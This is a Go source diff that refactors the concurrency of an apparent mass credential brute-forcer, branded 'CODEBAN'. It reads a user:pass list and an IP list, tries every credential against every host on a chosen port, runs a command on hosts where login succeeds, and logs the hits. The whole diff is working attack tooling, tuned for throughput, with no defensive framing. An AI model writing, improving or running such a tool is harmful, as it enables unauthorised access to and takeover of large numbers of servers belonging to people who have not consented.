@@ -20,7 +20,6 @@ var (
 	ipUserPairsMu  sync.Mutex
 	wg             sync.WaitGroup
 	allowedIPRange *net.IPNet
-	semaphore      = make(chan struct{}, 2000) // Adjust semaphore buffer size
 )
 
 type connectionStatus struct {
@@ -149,91 +148,102 @@ func checkVPS(userpassFile, command, ipListFile, port string, threads int) {
 	}
 	defer upf.Close()
 
-	var ipBatchMutex sync.Mutex
-	var ipBatch []string
+	semaphore := make(chan struct{}, threads)
 
-	// Launch a goroutine to process the IP batches
-	go func() {
-		var wg sync.WaitGroup
+	printBanner()
+	fmt.Printf("\n\n\033[01;34m[\033[01;31m▶\033[01;34m] \033[01;34mBrute Started\033[0m\n\n")
 
-		scannerIP := bufio.NewScanner(upf)
-		for scannerIP.Scan() {
-			userPass := scannerIP.Text()
-			parts := strings.SplitN(userPass, ":", 2)
-			if len(parts) == 2 {
-				user := parts[0]
-				pass := parts[1]
+	scanner := bufio.NewScanner(upf)
+	for scanner.Scan() {
+		userPass := scanner.Text()
+		parts := strings.SplitN(userPass, ":", 2)
+		if len(parts) == 2 {
+			user := parts[0]
+			pass := parts[1]
 
-				fmt.Printf("[%s] - [%s]\n", user, pass)
+			fmt.Printf("\033[01;34m[\033[0m %s \033[01;34m]\033[0m - \033[01;34m[\033[0m %s \033[01;34m]\033[0m\n", user, pass)
 
-				ipf, err := os.Open(ipListFile)
-				if err != nil {
-					handleError(NewCustomError(fmt.Sprintf("IP List - %s", err)))
-					continue
-				}
-				defer ipf.Close()
-
-				scannerIP := bufio.NewScanner(ipf)
-				for scannerIP.Scan() {
-					ip := scannerIP.Text()
-
-					ipBatchMutex.Lock()
-					ipBatch = append(ipBatch, ip)
-
-					// Process IP batch when it reaches a certain size
-					if len(ipBatch) >= threads {
-						// Increment the WaitGroup for the batch
-						wg.Add(1)
-						// Launch a goroutine to process the batch
-						go processIPBatch(user, pass, command, port, append([]string{}, ipBatch...), &wg)
-						// Clear the batch
-						ipBatch = nil
-					}
-					ipBatchMutex.Unlock()
-				}
-			} else {
-				warningMessage := fmt.Sprintf("Warn - Invalid user:pass format: %s\n", userPass)
-				color.Cyan(warningMessage)
+			ipf, err := os.Open(ipListFile)
+			if err != nil {
+				handleError(NewCustomError(fmt.Sprintf("IP List - %s", err)))
+				continue
 			}
+			defer ipf.Close()
+
+			scannerIP := bufio.NewScanner(ipf)
+			var ipBatch []string
+			for scannerIP.Scan() {
+				ip := scannerIP.Text()
+				ipBatch = append(ipBatch, ip)
+
+				// Print user and pass combination
+				fmt.Printf("[ %s ] - [ %s ]\n", user, pass)
+
+				// When the batch size is reached, process the batch concurrently
+				if len(ipBatch) == threads {
+					processIPBatch(user, pass, command, port, ipBatch, semaphore)
+					ipBatch = nil
+				}
+			}
+
+			// Process the remaining IPs in the last batch
+			if len(ipBatch) > 0 {
+				processIPBatch(user, pass, command, port, ipBatch, semaphore)
+			}
+		} else {
+			warningMessage := fmt.Sprintf("Warn - Invalid user:pass format: %s\n", userPass)
+			color.Cyan(warningMessage)
 		}
+	}
 
-		// Process any remaining IPs
-		if len(ipBatch) > 0 {
-			// Increment the WaitGroup for the remaining batch
-			wg.Add(1)
-			// Launch a goroutine to process the remaining batch
-			go processIPBatch("", "", "", "", append([]string{}, ipBatch...), &wg)
-		}
-
-		// Wait for all goroutines to finish processing IP batches
-		wg.Wait()
-	}()
-
-	// ...
-
-	// Wait for the IP batch processing goroutine to finish
+	// Wait for all goroutines to finish
 	wg.Wait()
 
 	// Display the colored completion message
-	fmt.Println("\n[ -- Finished -- ]")
+	fmt.Println("\n\033[01;34m[\033[01;31m      -- Finished --     \033[01;34m]\033[0m")
 }
 
-func processIPBatch(user, pass, command, port string, ipBatch []string, wg *sync.WaitGroup) {
-	defer wg.Done()
-
-	for _, ip := range ipBatch {
-		// Acquire semaphore
-		semaphore <- struct{}{}
-		wg.Add(1)
-		go func(user, pass, command, ip, port string) {
-			defer wg.Done()
-			defer func() {
-				// Release semaphore
-				<-semaphore
-			}()
+func processIPBatch(user, pass, command, port string, ipBatch []string, semaphore chan struct{}) {
+	// Acquire semaphore
+	semaphore <- struct{}{}
+	wg.Add(1)
+	go func(user, pass, command, port string, ipBatch []string) {
+		defer wg.Done()
+		defer func() {
+			// Release semaphore
+			<-semaphore
+		}()
+		for _, ip := range ipBatch {
 			checkConnectionForIP(user, pass, command, ip, port)
-		}(user, pass, command, ip, port)
+		}
+	}(user, pass, command, port, ipBatch)
+}
+
+func printBanner() {
+	fmt.Println("\033[01;34m╔══════════════════════════════════════════════════╗")
+	fmt.Println("\033[01;34m║\033[01;31m                  C O D E B A N                   \033[01;34m║")
+	fmt.Println("\033[01;34m╚══════════════════════════════════════════════════╝")
+}
+
+func handleError(err error) {
+	errorMessage := fmt.Sprintf("\n\t\t\033[31mC O\033[33m D E \033[096mB A N\033[0m\n\n\033[01;34m[ \033[01;31m-\033[01;34m ] \033[01;31mError \033[0m- %s\n", err)
+	color.Cyan(errorMessage)
+}
+
+func countLines(filename string) (int, error) {
+	file, err := os.Open(filename)
+	if err != nil {
+		return 0, err
 	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+	count := 0
+	for scanner.Scan() {
+		count++
+	}
+
+	return count, scanner.Err()
 }
 
 func handleGoodConnection(ip, user, pass string, output []byte, port string) {
@@ -285,11 +295,6 @@ func logToFile(file *os.File, logEntry string) {
 	if _, err := file.WriteString(logEntry + "\n"); err != nil {
 		handleError(NewCustomError("Failed to write to log file"))
 	}
-}
-
-func handleError(err error) {
-	errorMessage := fmt.Sprintf("\n\t\t\033[31mC O\033[33m D E \033[096mB A N\033[0m\n\n\033[01;34m[ \033[01;31m-\033[01;34m ] \033[01;31mError \033[0m- %s\n", err)
-	color.Cyan(errorMessage)
 }
 
 func main() {
